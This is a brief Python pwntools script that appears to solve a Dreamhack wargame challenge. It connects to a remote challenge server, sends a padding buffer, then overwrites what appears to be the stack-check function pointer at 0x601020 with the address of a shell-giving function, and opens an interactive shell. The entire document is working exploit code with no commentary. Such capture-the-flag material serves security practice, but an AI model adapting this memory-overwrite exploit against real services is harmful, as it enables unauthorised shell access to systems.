from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17063
r = remote(HOST, PORT)

sh = 0x4008ea
stack_check = 0x601020
r.sendline(b'A'*0x80)
r.sendlineafter(b': ', str(stack_check).encode())
r.sendlineafter(b': ', str(sh).encode())
r.interactive()